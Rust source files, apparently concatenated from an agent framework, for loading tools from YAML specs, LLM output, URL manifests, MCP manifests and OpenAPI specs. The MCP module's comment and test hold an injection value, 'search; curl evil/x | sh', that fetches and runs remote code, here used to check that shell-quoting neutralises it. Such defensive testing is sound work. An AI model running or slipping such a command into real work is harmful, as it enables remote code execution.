        let content = tokio::fs::read_to_string(path).await.map_err(|e| {
            SourceError::Io {
                src: "declarative".into(),
                inner: e,
            }
        })?;
        Self::parse(&content)
    }
    /// Build the spec's tools as ready-to-register `ShellTool`s.
    pub fn build_tools(&self) -> Vec<ToolArc> {
        self.tools
            .iter()
            .map(|t| {
                let mut schema = Schema::new();
                for p in &t.params {
                    let mut param = Parameter {
                        name: p.name.clone(),
                        description: p.description.clone(),
                        typ: parse_param_type(&p.typ),
                        required: p.required,
                        default: p.default.clone(),
                        enum_values: Vec::new(),
                    };
                    if param.description.is_empty() {
                        param.description = String::new();
                    }
                    schema = schema.param(param);
                }
                let mut shell = ShellTool::new(
                    t.name.clone(),
                    t.description.clone(),
                    schema,
                    t.command.clone(),
                    ToolSourceKind::Declarative,
                );
                shell.cwd = t.cwd.clone();
                rc_core::tool::arc(shell)
            })
            .collect()
    }
}

pub struct DeclarativeSource {
    spec: DeclarativeSpec,
    origin: String,
}

impl DeclarativeSource {
    /// Build from an already-parsed spec.
    pub fn from_spec(spec: DeclarativeSpec, origin: impl Into<String>) -> Self {
        Self {
            spec,
            origin: origin.into(),
        }
    }
    /// Load a YAML/JSON spec file.
    pub async fn from_file(path: &str) -> Result<Self, SourceError> {
        let spec = DeclarativeSpec::load_file(path).await?;
        Ok(Self::from_spec(spec, path))
    }
}

#[async_trait]
impl ToolSource for DeclarativeSource {
    fn kind(&self) -> ToolSourceKind {
        ToolSourceKind::Declarative
    }
    fn id(&self) -> &str {
        &self.origin
    }
    async fn tools(&self) -> Result<Vec<ToolArc>, SourceError> {
        Ok(self.spec.build_tools())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rc_core::Registry;

    #[test]
    fn parse_and_build_yaml() {
        let yaml = r#"
tools:
  - name: git.status
    description: git status
    command: "git -C {{repo}} status"
    params:
      - { name: repo, type: string, required: true, description: repo path }
  - name: echo.hi
    description: echo
    command: "echo hi"
"#;
        let spec = DeclarativeSpec::parse(yaml).unwrap();
        assert_eq!(spec.tools.len(), 2);
        let tools = spec.build_tools();
        assert_eq!(tools.len(), 2);
        let r = Registry::new();
        r.register_all(tools);
        assert!(r.contains("git.status"));
        assert!(r.contains("echo.hi"));
        // git.status has a required string param "repo"
        let t = r.get("git.status").unwrap();
        assert_eq!(t.schema().parameters.len(), 1);
        assert!(t.schema().parameters[0].required);
    }

    #[test]
    fn parse_json() {
        let json = r#"{"tools":[{"name":"x.y","description":"d","command":"echo {{s}}","params":[{"name":"s","type":"string","required":true}]}]}"#;
        let spec = DeclarativeSpec::parse(json).unwrap();
        assert_eq!(spec.tools.len(), 1);
    }
}

```rust
//! # rc-sources — the 8 universal tool-source mechanisms (the "unlimited" part)
//!
//! A tool source is anything that implements [`ToolSource`] — discover and
//! produce ready-to-register [`ToolArc`] handles. Any tool ever conceived fits
//! into at least one of these eight mechanisms, which is what makes the
//! framework "unlimited":
//!
//! | # | source | module | what it wraps |
//! |---|--------|--------|---------------|
//! | 1 | builtin | [`builtin`] | the shipped 38-tool catalog |
//! | 2 | declarative | [`declarative`] | a YAML/JSON spec → shell tool (no code) |
//! | 3 | llm_gen | [`llm_gen`] | natural language → LLM emits a spec → tool |
//! | 4 | openapi | [`openapi`] | an OpenAPI 3 spec → N HTTP tools |
//! | 5 | rest | [`rest`] | one HTTP endpoint → one tool |
//! | 6 | cli | [`cli`] | a binary + arg template → one tool |
//! | 7 | mcp | [`mcp`] | an MCP `tools/list` manifest → tools via a bridge |
//! | 8 | marketplace | [`marketplace`] | a manifest fetched from a URL/file → tools |
//!
//! Sources feed a [`SourceRegistry`], which the lifecycle manager walks to
//! discover and load every tool. Adding a ninth mechanism is one `impl
//! ToolSource` away.

pub mod builtin;
pub mod cli;
pub mod declarative;
pub mod llm_gen;
pub mod marketplace;
pub mod mcp;
pub mod openapi;
pub mod rest;
pub mod source;
pub mod tools;

pub use source::{SourceError, SourceRegistry, ToolSource};
pub use tools::{shell_quote, HttpTool, ShellTool};

/// Convenience: build a [`SourceRegistry`] pre-loaded with just the builtin
/// source. The CLI and lifecycle manager add more sources on demand.
pub fn builtin_only() -> SourceRegistry {
    let mut sr = SourceRegistry::new();
    sr.add(builtin::BuiltinSource);
    sr
}
```

## `crates/rc-tools/rc-sources/src/llm_gen.rs`

[view on disk](crates/rc-tools/rc-sources/src/llm_gen.rs)

````rust
//! Source 3 of 8 — **LLM-generated**. Describe a tool in natural language; the
//! source asks an LLM (via a configurable command, default `z-ai`) to emit a
//! declarative tool spec as JSON, parses it, and builds a [`ShellTool`]. This
//! is the "literally any tool anyone can describe" mechanism.
//!
//! The contract with the LLM command: the rendered prompt is written to the
//! command's stdin; the command's stdout must contain a JSON object shaped
//! like a declarative tool:
//!
//! ```json
//! {"name":"file.line_count","description":"Count lines in a file",
//!  "command":"wc -l < {{path}}","params":[{"name":"path","type":"string","required":true}]}
//! ```
//!
//! The first `{ … }` block in the output is extracted, so leading/trailing
//! prose is tolerated. Any LLM CLI that reads a prompt from stdin and writes
//! text to stdout works (`z-ai`, `llm`, `og`, a curl-to-an-API wrapper, …).

use crate::declarative::DeclarativeTool;
use crate::source::{SourceError, ToolSource};
use crate::tools::ShellTool;
use async_trait::async_trait;
use rc_core::schema::Schema;
use rc_core::tool::{arc, ToolArc, ToolSourceKind};
use tokio::io::AsyncWriteExt;

const DEFAULT_PROMPT: &str = "\
You are a tool generator. Output ONE JSON object (no prose, no markdown fences) describing a single shell-backed tool.
Schema:
{\"name\":\"<dotted.name>\",\"description\":\"<one line>\",\"command\":\"<shell cmd with {{param}} placeholders>\",\"params\":[{\"name\":\"<p>\",\"type\":\"string|integer|number|boolean\",\"required\":true|false,\"description\":\"<one line>\"}]}
Rules:
- name is dot-namespaced (e.g. file.line_count).
- command uses {{param}} placeholders for every param.
- prefer simple, widely-available commands.
Description of the tool to generate:\n";

pub struct LlmGenSource {
    /// The command to run, e.g. ["z-ai", "function", "-n", "chat"].
    command: Vec<String>,
    /// Prompt template; `{{description}}` is substituted with each tool's
    /// description.
    prompt_template: String,
    /// The tool descriptions to generate.
    descriptions: Vec<String>,
    origin: String,
}

impl LlmGenSource {
    /// Default generator using `z-ai`.
    pub fn new() -> Self {
        Self {
            command: vec!["z-ai".into(), "function".into(), "-n".into(), "chat".into()],
            prompt_template: DEFAULT_PROMPT.to_string(),
            descriptions: Vec::new(),
            origin: "llm_gen".into(),
        }
    }

    /// Use a custom command (e.g. ["llm", "-m", "gpt-4o"]).
    pub fn with_command(mut self, command: Vec<String>) -> Self {
        self.command = command;
        self
    }

    pub fn with_prompt_template(mut self, tmpl: impl Into<String>) -> Self {
        self.prompt_template = tmpl.into();
        self
    }

    /// Queue a tool to generate from a natural-language description.
    pub fn add(&mut self, description: impl Into<String>) -> &mut Self {
        self.descriptions.push(description.into());
        self
    }

    /// Generate one tool from a description by calling the LLM command.
    pub async fn generate(&self, description: &str) -> Result<ToolArc, SourceError> {
        let prompt = self
            .prompt_template
            .replace("{{description}}", description);
        let rendered = if !prompt.contains("{{description}}") && !description.is_empty() {
            format!("{prompt}{description}")
        } else {
            prompt
        };

        // Spawn the command, write the prompt to stdin, capture stdout.
        let mut cmd = if self.command.is_empty() {
            return Err(SourceError::other(
                "llm_gen",
                "no command configured",
            ));
        } else {
            let mut c = tokio::process::Command::new(&self.command[0]);
            c.args(&self.command[1..]);
            // Kill the generator if this future is cancelled/timed out.
            c.kill_on_drop(true);
            c.stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped());
            c
        };
        let mut child = cmd.spawn().map_err(|e| SourceError::Io {
            src: "llm_gen".into(),
            inner: e,
        })?;
        // Write the prompt from a separate task: writing stdin to completion
        // BEFORE reading stdout deadlocks against a generator that fills its
        // stdout pipe first. The spawned task lets `wait_with_output` read
        // concurrently with the write.
        let stdin_task = match child.stdin.take() {
            Some(mut stdin) => {
                let prompt = rendered.clone();
                Some(tokio::spawn(async move {
                    stdin.write_all(prompt.as_bytes()).await
                }))
            }
            None => None,
        };
        // A wedged generator must not hang this future forever: cap the wait
        // at 120 s. On expiry the future (owning the child) is dropped and
        // `kill_on_drop` terminates the generator.
        let wait = async {
            let out = child.wait_with_output().await;
            if let Some(task) = stdin_task {
                let _ = task.await;
            }
            out
        };
        let output = match tokio::time::timeout(std::time::Duration::from_secs(120), wait).await
        {
            Ok(out) => out.map_err(|e| SourceError::Io {
                src: "llm_gen".into(),
                inner: e,
            })?,
            Err(_) => {
                return Err(SourceError::other(
                    "llm_gen",
                    "generator timed out after 120s",
                ));
            }
        };
        if !output.status.success() {
            return Err(SourceError::other(
                "llm_gen",
                format!(
                    "command {:?} exited with {:?}; stderr: {}",
                    self.command,
                    output.status.code(),
                    String::from_utf8_lossy(&output.stderr)
                ),
            ));
        }
        let stdout = String::from_utf8_lossy(&output.stdout);
        let spec_json = extract_first_json_object(&stdout).ok_or_else(|| {
            SourceError::other(
                "llm_gen",
                format!("no JSON object found in command output: {}", stdout.chars().take(200).collect::<String>()),
            )
        })?;
        let dt: DeclarativeTool = serde_json::from_str(&spec_json).map_err(|e| {
            SourceError::Json {
                src: "llm_gen".into(),
                inner: e,
            }
        })?;
        Ok(tool_from_declarative(dt, ToolSourceKind::LlmGenerated))
    }
}

impl Default for LlmGenSource {
    fn default() -> Self {
        Self::new()
    }
}

/// Build a `ShellTool` from a parsed declarative tool, tagged with a source kind.
pub(crate) fn tool_from_declarative(dt: DeclarativeTool, kind: ToolSourceKind) -> ToolArc {
    let mut schema = Schema::new();
    for p in &dt.params {
        schema = schema.param(rc_core::schema::Parameter {
            name: p.name.clone(),
            description: p.description.clone(),
            typ: crate::declarative::parse_param_type(&p.typ),
            required: p.required,
            default: p.default.clone(),
            enum_values: Vec::new(),
        });
    }
    arc(ShellTool::new(
        dt.name,
        dt.description,
        schema,
        dt.command,
        kind,
    ))
}

/// Extract the first balanced `{ … }` object from a string (tolerates leading
/// prose and code fences).
fn extract_first_json_object(s: &str) -> Option<String> {
    let start = s.find('{')?;
    let bytes = s.as_bytes();
    let mut depth = 0i32;
    let mut in_str = false;
    let mut esc = false;
    for (i, &b) in bytes.iter().enumerate().skip(start) {
        if in_str {
            if esc {
                esc = false;
            } else if b == b'\\' {
                esc = true;
            } else if b == b'"' {
                in_str = false;
            }
        } else if b == b'"' {
            in_str = true;
        } else if b == b'{' {
            depth += 1;
        } else if b == b'}' {
            depth -= 1;
            if depth == 0 {
                return Some(s[start..=i].to_string());
            }
        }
    }
    None
}

#[async_trait]
impl ToolSource for LlmGenSource {
    fn kind(&self) -> ToolSourceKind {
        ToolSourceKind::LlmGenerated
    }
    fn id(&self) -> &str {
        &self.origin
    }
    async fn tools(&self) -> Result<Vec<ToolArc>, SourceError> {
        let mut out = Vec::new();
        for d in &self.descriptions {
            out.push(self.generate(d).await?);
        }
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extract_json_object_handles_prose() {
        let s = "Sure! Here is the tool:\n{\"name\":\"x.y\",\"command\":\"echo\"}\nLet me know.";
        let j = extract_first_json_object(s).unwrap();
        assert!(j.starts_with('{'));
        assert!(j.ends_with('}'));
        let v: serde_json::Value = serde_json::from_str(&j).unwrap();
        assert_eq!(v["name"], "x.y");
    }

    #[test]
    fn extract_json_object_handles_nested() {
        let s = r#"{"a":{"b":1},"c":2}"#;
        let j = extract_first_json_object(s).unwrap();
        assert_eq!(j, s);
    }

    #[tokio::test]
    async fn generate_with_cat_as_mock_llm() {
        // `cat` echoes stdin back; feed it a JSON spec as the "prompt".
        let spec = r#"{"name":"file.wc","description":"count words","command":"wc -w < {{path}}","params":[{"name":"path","type":"string","required":true}]}"#;
        let mut src = LlmGenSource::new().with_command(vec!["cat".into()]);
        // Override the prompt template so the spec passes through verbatim.
        src.prompt_template = spec.to_string();
        let tool = src.generate("ignored — cat echoes the template").await.unwrap();
        assert_eq!(tool.name(), "file.wc");
        assert_eq!(tool.source(), ToolSourceKind::LlmGenerated);
        assert_eq!(tool.schema().parameters.len(), 1);
    }
}
````

## `crates/rc-tools/rc-sources/src/marketplace.rs`

[view on disk](crates/rc-tools/rc-sources/src/marketplace.rs)

```rust
//! Source 8 of 8 — **marketplace / URL import**. Fetch a manifest of
//! declarative tool specs (the same JSON/YAML shape the `declarative` source
//! reads) from a URL or a file, and produce [`ShellTool`]s tagged
//! `marketplace`. Point this at any tool registry that serves the manifest
//! format — a git raw URL, a company-internal index, a community catalog.
//!
//! This is the community-driven infinite-supply mechanism: anyone can publish
//! a manifest, anyone can pull it.

use crate::declarative::DeclarativeSpec;
use crate::llm_gen::tool_from_declarative;
use crate::source::{SourceError, ToolSource};
use async_trait::async_trait;
use rc_core::tool::{ToolArc, ToolSourceKind};

pub struct MarketplaceSource {
    spec: DeclarativeSpec,
    origin: String,
}

impl MarketplaceSource {
    pub fn from_str(content: &str, origin: impl Into<String>) -> Result<Self, SourceError> {
        let spec = DeclarativeSpec::parse(content)?;
        Ok(Self {
            spec,
            origin: origin.into(),
        })
    }
    pub async fn from_file(path: &str) -> Result<Self, SourceError> {
        let content = tokio::fs::read_to_string(path)
            .await
            .map_err(|e| SourceError::Io {
                src: "marketplace".into(),
                inner: e,
            })?;
        Self::from_str(&content, path)
    }
    /// Fetch a manifest from a URL.
    pub async fn from_url(url: &str) -> Result<Self, SourceError> {
        let resp = reqwest::get(url).await.map_err(|e| SourceError::Http {
            src: "marketplace".into(),
            inner: e.to_string(),
        })?;
        let content = resp.text().await.map_err(|e| SourceError::Http {
            src: "marketplace".into(),
            inner: e.to_string(),
        })?;
        Self::from_str(&content, url)
    }
}

#[async_trait]
impl ToolSource for MarketplaceSource {
    fn kind(&self) -> ToolSourceKind {
        ToolSourceKind::Marketplace
    }
    fn id(&self) -> &str {
        &self.origin
    }
    async fn tools(&self) -> Result<Vec<ToolArc>, SourceError> {
        Ok(self
            .spec
            .tools
            .iter()
            .map(|t| tool_from_declarative(t.clone(), ToolSourceKind::Marketplace))
            .collect())
    }
}

"#;

````rust
//! Source 7 of 8 — **MCP adapter**. Reads an MCP server's `tools/list`
//! response (a JSON manifest of tool name/description/inputSchema) and produces
//! a [`ShellTool`] for each, tagged `mcp`. Each tool's command template invokes
//! a configurable bridge binary (default `mcp-call`) that turns the call into
//! an MCP `tools/call` JSON-RPC round-trip over the server's transport
//! (stdio, SSE, …). Wire your own transport by pointing `bridge` at a binary
//! that speaks MCP; the framework handles the rest.
//!
//! The manifest shape (what `tools/list` returns):
//! ```json
//! {"tools":[{"name":"search","description":"search the web",
//!   "inputSchema":{"type":"object","properties":{"q":{"type":"string"}},"required":["q"]}}]}
//! ```

use crate::source::{SourceError, ToolSource};
use crate::tools::{shell_quote, ShellTool};
use async_trait::async_trait;
use rc_core::schema::{ParamType, Parameter, Schema};
use rc_core::tool::{arc, ToolArc, ToolSourceKind};
use serde::Deserialize;
use serde_json::Value;

#[derive(Debug, Deserialize)]
struct McpManifest {
    #[serde(default)]
    tools: Vec<McpTool>,
}
#[derive(Debug, Deserialize)]
struct McpTool {
    name: String,
    #[serde(default)]
    description: String,
    #[serde(default)]
    #[serde(rename = "inputSchema")]
    input_schema: Value,
}

/// Turn an MCP `inputSchema` (JSON-Schema-ish) into our `Schema`.
fn schema_from_input_schema(v: &Value) -> Schema {
    let mut schema = Schema::new();
    if let Some(props) = v.get("properties").and_then(|p| p.as_object()) {
        let required: Vec<String> = v
            .get("required")
            .and_then(|r| r.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|x| x.as_str().map(String::from))
                    .collect()
            })
            .unwrap_or_default();
        for (name, def) in props {
            let typ = def
                .get("type")
                .and_then(|t| t.as_str())
                .map(oapi_type)
                .unwrap_or(ParamType::Any);
            let desc = def
                .get("description")
                .and_then(|d| d.as_str())
                .unwrap_or("")
                .to_string();
            schema = schema.param(Parameter {
                name: name.clone(),
                description: desc,
                typ,
                required: required.contains(name),
                default: None,
                enum_values: Vec::new(),
            });
        }
    }
    schema
}

fn oapi_type(s: &str) -> ParamType {
    match s {
        "integer" => ParamType::Integer,
        "number" => ParamType::Number,
        "boolean" => ParamType::Boolean,
        "object" => ParamType::Object,
        "array" => ParamType::Array(Box::new(ParamType::Any)),
        _ => ParamType::String,
    }
}

pub struct McpSource {
    manifest: McpManifest,
    /// The bridge binary + args; the tool name is appended as the next arg,
    /// and the rendered params are passed as a final JSON arg.
    bridge: Vec<String>,
    origin: String,
}

impl McpSource {
    pub fn from_manifest_json(
        json: &str,
        bridge: Vec<String>,
        origin: impl Into<String>,
    ) -> Result<Self, SourceError> {
        let manifest: McpManifest = serde_json::from_str(json).map_err(|e| SourceError::Json {
            src: "mcp".into(),
            inner: e,
        })?;
        Ok(Self {
            manifest,
            bridge,
            origin: origin.into(),
        })
    }
    pub async fn from_file(path: &str, bridge: Vec<String>) -> Result<Self, SourceError> {
        let json = tokio::fs::read_to_string(path).await.map_err(|e| {
            SourceError::Io {
                src: "mcp".into(),
                inner: e,
            }
        })?;
        Self::from_manifest_json(&json, bridge, path)
    }
}

#[async_trait]
impl ToolSource for McpSource {
    fn kind(&self) -> ToolSourceKind {
        ToolSourceKind::Mcp
    }
    fn id(&self) -> &str {
        &self.origin
    }
    async fn tools(&self) -> Result<Vec<ToolArc>, SourceError> {
        let bridge = if self.bridge.is_empty() {
            vec!["mcp-call".to_string()]
        } else {
            self.bridge.clone()
        };
        let mut out = Vec::new();
        for t in &self.manifest.tools {
            let schema = schema_from_input_schema(&t.input_schema);
            let cmd = command_template(&bridge, &t.name, &schema);
            out.push(arc(ShellTool::new(
                t.name.clone(),
                t.description.clone(),
                schema,
                cmd,
                ToolSourceKind::Mcp,
            )));
        }
        Ok(out)
    }
}

/// Build the bridge command template for one MCP tool. The tool *name* comes
/// from the remote manifest, so it is shell-quoted like any other substituted
/// value: a hostile manifest name such as `search; curl evil/x | sh` becomes
/// one literal argument to the bridge — the tool still runs, the name is
/// still passed, it just can never be interpreted as shell syntax. Params are
/// passed as `--name {{name}}` pairs and substituted (single shell words) at
/// call time.
fn command_template(bridge: &[String], tool_name: &str, schema: &Schema) -> String {
    let mut cmd = bridge.join(" ");
    cmd.push(' ');
    cmd.push_str(&shell_quote(tool_name));
    for p in &schema.parameters {
        cmd.push_str(&format!(" --{} {{{{{}}}}}", p.name, p.name));
    }
    cmd
}

#[cfg(test)]
mod tests {
    use super::*;
    use rc_core::Registry;

    #[test]
    fn manifest_to_tools() {
        let json = r#"{"tools":[
            {"name":"search","description":"search the web",
             "inputSchema":{"type":"object","properties":{"q":{"type":"string","description":"query"}},"required":["q"]}}
        ]}"#;
        let src = McpSource::from_manifest_json(json, vec!["mcp-call".into()], "test").unwrap();
        // tools() is async; we can't easily await in a sync test, so check the
        // manifest directly.
        assert_eq!(src.manifest.tools.len(), 1);
        let s = schema_from_input_schema(&src.manifest.tools[0].input_schema);
        assert_eq!(s.parameters.len(), 1);
        assert_eq!(s.parameters[0].name, "q");
        assert!(s.parameters[0].required);
    }

    #[test]
    fn hostile_tool_name_is_quoted_not_injected() {
        // A hostile manifest name must land in the command template as one
        // shell-quoted literal argument — the bridge still runs and still
        // receives the name, it just cannot be interpreted as shell syntax.
        let schema = Schema::new().param(Parameter::required("q", ParamType::String));
        let tmpl = command_template(
            &["mcp-call".to_string()],
            "search; curl evil/x | sh",
            &schema,
        );
        assert_eq!(
            tmpl,
            "mcp-call 'search; curl evil/x | sh' --q {{q}}"
        );
        // A benign name is unaffected apart from the (harmless) quoting.
        let tmpl = command_template(
            &["mcp-call".to_string(), "--server".to_string()],
            "search",
            &Schema::new(),
        );
        assert_eq!(tmpl, "mcp-call --server 'search'");
    }

    #[tokio::test]
    async fn tools_register() {
        let json = r#"{"tools":[{"name":"m.tool","description":"d","inputSchema":{"type":"object","properties":{"x":{"type":"integer"}}}}]}"#;
        let src = McpSource::from_manifest_json(json, vec!["mcp-call".into()], "t").unwrap();
        let tools = src.tools().await.unwrap();
        let r = Registry::new();
        r.register_all(tools);
        assert!(r.contains("m.tool"));
    }
}

```rust
//! Source 4 of 8 — **OpenAPI import**. Point at an OpenAPI 3 (Swagger) JSON
//! spec (a URL or a file), get one [`HttpTool`] per `path × method`. Every
//! REST API in the world becomes a set of RomaCode tools.

use crate::source::{SourceError, ToolSource};
use crate::tools::HttpTool;
use async_trait::async_trait;
use rc_core::schema::{ParamType, Parameter, Schema};
use rc_core::tool::{arc, ToolArc, ToolSourceKind};
use serde::Deserialize;
use serde_json::Value;

#[derive(Debug, Deserialize)]
struct OpenApiSpec {
    #[serde(default)]
    servers: Vec<Server>,
    #[serde(default)]
    paths: serde_json::Map<String, Value>,
}
#[derive(Debug, Deserialize)]
struct Server {
    url: String,
}
#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct Operation {
    #[serde(default)]
    operation_id: Option<String>,
    #[serde(default)]
    summary: Option<String>,
    #[serde(default)]
    parameters: Vec<RefOr<ParameterDef>>,
    #[serde(default)]
    request_body: Option<RequestBody>,
}
#[derive(Debug, Deserialize)]
struct ParameterDef {
    name: String,
    #[serde(default)]
    #[allow(dead_code)]
    #[serde(rename = "in")]
    location: Option<String>,
    #[serde(default)]
    required: bool,
    #[serde(default)]
    description: Option<String>,
    #[serde(default)]
    schema: Option<SchemaRef>,
}
#[derive(Debug, Deserialize)]
struct SchemaRef {
    #[serde(rename = "type")]
    #[serde(default)]
    typ: Option<String>,
}
#[derive(Debug, Deserialize)]
struct RequestBody {
    #[serde(default)]
    description: Option<String>,
    #[serde(default)]
    required: bool,
}
#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum RefOr<T> {
    // `$ref` resolution is a TODO; for now we skip ref'd parameters/operations.
    Ref {
        #[serde(rename = "$ref")]
        #[allow(dead_code)]
        reference: String,
    },
    Inline(T),
}

const METHODS: &[&str] = &["get", "post", "put", "patch", "delete", "head"];

fn oapi_type(s: &str) -> ParamType {
    match s {
        "integer" => ParamType::Integer,
        "number" => ParamType::Number,
        "boolean" => ParamType::Boolean,
        "object" => ParamType::Object,
        "array" => ParamType::Array(Box::new(ParamType::Any)),
        _ => ParamType::String,
    }
}

/// Parse an OpenAPI 3 JSON string into a list of HTTP tools.
pub fn parse_spec(json: &str) -> Result<Vec<ToolArc>, SourceError> {
    let spec: OpenApiSpec = serde_json::from_str(json).map_err(|e| SourceError::Json {
        src: "openapi".into(),
        inner: e,
    })?;
    let base = spec
        .servers
        .first()
        .map(|s| s.url.trim_end_matches('/').to_string())
        .unwrap_or_default();
    let mut out = Vec::new();
    for (path, item) in &spec.paths {
        let Some(ops) = item.as_object() else { continue };
        for &method in METHODS {
            let Some(op_val) = ops.get(method) else { continue };
            let op: Operation = serde_json::from_value(op_val.clone()).map_err(|e| {
                SourceError::Json {
                    src: "openapi".into(),
                    inner: e,
                }
            })?;
            let name = op
                .operation_id
                .clone()
                .unwrap_or_else(|| slug(&format!("{}_{}", method, path)));
            let mut schema = Schema::new();
            // path + query params
            for p in &op.parameters {
                if let RefOr::Inline(def) = p {
                    let typ = def
                        .schema
                        .as_ref()
                        .and_then(|s| s.typ.as_deref())
                        .map(oapi_type)
                        .unwrap_or(ParamType::String);
                    schema = schema.param(
                        Parameter {
                            name: def.name.clone(),
                            description: def.description.clone().unwrap_or_default(),
                            typ,
                            required: def.required,
                            default: None,
                            enum_values: Vec::new(),
                        },
                    );
                }
            }
            // request body → a single "body" object param
            if let Some(rb) = &op.request_body {
                schema = schema.param(Parameter {
                    name: "body".into(),
                    description: rb.description.clone().unwrap_or_default(),
                    typ: ParamType::Any,
                    required: rb.required,
                    default: None,
                    enum_values: Vec::new(),
                });
            }
            // url: base + path, with {param} → {{param}}
            let mut url = if base.is_empty() {
                path.clone()
            } else {
                format!("{base}{path}")
            };
            // OpenAPI path params use {id}; our template uses {{id}}.
            for p in &op.parameters {
                if let RefOr::Inline(def) = p {
                    url = url.replace(&format!("{{{}}}", def.name), &format!("{{{{{}}}}}", def.name));
                }
            }
            let mut tool = HttpTool::new(
                name,
                op.summary.clone().unwrap_or_else(|| format!("{method} {path}")),
                schema,
                method.to_uppercase(),
                url,
                ToolSourceKind::OpenApi,
            );
            if op.request_body.is_some() {
                tool.body = Some("{{body}}".to_string());
            }
            out.push(arc(tool));
        }
    }
    Ok(out)
}

fn slug(s: &str) -> String {
    s.chars()
        .map(|c| if c.is_alphanumeric() { c } else { '.' })
        .collect::<String>()
        .trim_matches('.')
        .to_string()
}

pub struct OpenApiSource {
    json: String,
    origin: String,
}

impl OpenApiSource {
    pub fn from_str(json: impl Into<String>, origin: impl Into<String>) -> Self {
        Self {
            json: json.into(),
            origin: origin.into(),
        }
    }
    pub async fn from_file(path: &str) -> Result<Self, SourceError> {
        let json = tokio::fs::read_to_string(path).await.map_err(|e| {
            SourceError::Io {
                src: "openapi".into(),
                inner: e,
            }
        })?;
        Ok(Self::from_str(json, path))
    }
    /// Fetch a spec from a URL.
    pub async fn from_url(url: &str) -> Result<Self, SourceError> {
        let resp = reqwest::get(url).await.map_err(|e| SourceError::Http {
            src: "openapi".into(),
            inner: e.to_string(),
        })?;
        let json = resp.text().await.map_err(|e| SourceError::Http {
            src: "openapi".into(),
            inner: e.to_string(),
        })?;
        Ok(Self::from_str(json, url))
    }
}

#[async_trait]
impl ToolSource for OpenApiSource {
    fn kind(&self) -> ToolSourceKind {
        ToolSourceKind::OpenApi
    }
    fn id(&self) -> &str {
        &self.origin
    }
    async fn tools(&self) -> Result<Vec<ToolArc>, SourceError> {
        parse_spec(&self.json)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rc_core::Registry;

    #[test]
    fn parse_petstore_like_spec() {
        let json = r#"{
          "openapi": "3.0.0",
          "servers": [{"url": "https://api.example.com/v1"}],
          "paths": {
            "/pets/{petId}": {
              "get": {
                "operationId": "getPetById",
                "summary": "Find a pet by ID",
                "parameters": [{"name":"petId","in":"path","required":true,"schema":{"type":"integer"},"description":"pet id"}]
              },
              "delete": {"operationId": "deletePet"}
            },
            "/pets": {
              "post": {
                "operationId": "addPet",
                "summary": "Add a pet",
                "requestBody": {"required": true, "description": "the pet body"}
              }
            }
          }
        }"#;
        let tools = parse_spec(json).unwrap();
        assert_eq!(tools.len(), 3);
        let r = Registry::new();
        r.register_all(tools);
        assert!(r.contains("getPetById"));
        assert!(r.contains("deletePet"));
        assert!(r.contains("addPet"));
        let get = r.get("getPetById").unwrap();
        // url should have {{petId}} template
        // (HttpTool stores url privately; check schema instead)
        assert_eq!(get.schema().parameters.len(), 1);
        assert_eq!(get.schema().parameters[0].name, "petId");
        assert!(get.schema().parameters[0].required);
        let post = r.get("addPet").unwrap();
        assert_eq!(post.schema().parameters.len(), 1);
        assert_eq!(post.schema().parameters[0].name, "body");
    }
}

//! Source 5 of 8 — **REST endpoint wrapper**. Wrap a single HTTP endpoint as a
//! tool: method, URL template, optional body template, optional static
//! headers, and the params. Good for one-off integrations without a full
//! OpenAPI spec.

use crate::source::{SourceError, ToolSource};
use crate::tools::HttpTool;
use async_trait::async_trait;
use rc_core::schema::Schema;
use rc_core::tool::{arc, ToolArc, ToolSourceKind};

pub struct RestSource {
    tool: HttpTool,
}

impl RestSource {
    pub fn new(
        name: impl Into<String>,
        description: impl Into<String>,
        schema: Schema,
        method: impl Into<String>,
        url: impl Into<String>,
    ) -> Self {
        Self {
            tool: HttpTool::new(name, description, schema, method, url, ToolSourceKind::Rest),
        }
    }
    pub fn with_body(mut self, body: impl Into<String>) -> Self {
        self.tool.body = Some(body.into());
        self
    }
    pub fn with_header(mut self, k: impl Into<String>, v: impl Into<String>) -> Self {
        self.tool.headers.push((k.into(), v.into()));
        self
    }
}

#[async_trait]
impl ToolSource for RestSource {
    fn kind(&self) -> ToolSourceKind {
        ToolSourceKind::Rest
    }
    fn id(&self) -> &str {
        &self.tool.name
    }
    async fn tools(&self) -> Result<Vec<ToolArc>, SourceError> {
        Ok(vec![arc(self.tool.clone())])
    }
}

```rust
//! The [`ToolSource`] trait — the single contract every tool-source mechanism
//! implements. A source discovers and produces ready-to-register tools. The
//! lifecycle manager walks a [`SourceRegistry`] of sources, asks each for its
//! tools, and registers them.
//!
//! This is the "unlimited" surface: any new mechanism (a new protocol, a new
//! registry, a new generator) plugs in by implementing one async method.

use async_trait::async_trait;
use rc_core::tool::{ToolArc, ToolSourceKind};
use thiserror::Error;

/// Errors a source can surface during discovery or loading. Note: the field
/// is named `src`, not `source` — `source` is a magic name in `thiserror`
/// (it auto-joins the error chain) and our value is a plain `String` id.
#[derive(Debug, Error)]
pub enum SourceError {
    #[error("source `{src}`: {detail}")]
    Other { src: String, detail: String },

    #[error("source `{src}`: i/o error: {inner}")]
    Io {
        src: String,
        #[source]
        inner: std::io::Error,
    },

    #[error("source `{src}`: json error: {inner}")]
    Json {
        src: String,
        #[source]
        inner: serde_json::Error,
    },

    #[error("source `{src}`: yaml error: {inner}")]
    Yaml {
        src: String,
        #[source]
        inner: serde_yaml::Error,
    },

    #[error("source `{src}`: http error: {inner}")]
    Http { src: String, inner: String },

    #[error("source `{src}`: not implemented — {detail}")]
    NotImplemented { src: String, detail: String },
}

impl SourceError {
    pub fn other(src: impl Into<String>, detail: impl Into<String>) -> Self {
        Self::Other {
            src: src.into(),
            detail: detail.into(),
        }
    }
}

/// The contract every tool source implements. `tools()` discovers and loads in
/// one step: it returns fully-built, ready-to-register [`ToolArc`] handles.
#[async_trait]
pub trait ToolSource: Send + Sync {
    /// Which of the 8 mechanisms this source is.
    fn kind(&self) -> ToolSourceKind;
    /// A short id for this source instance (e.g. `builtin`, `openapi:petstore`,
    /// `declarative:./tools.yaml`).
    fn id(&self) -> &str;
    /// Produce every tool this source can. Called by the lifecycle manager
    /// during the discover+load phase.
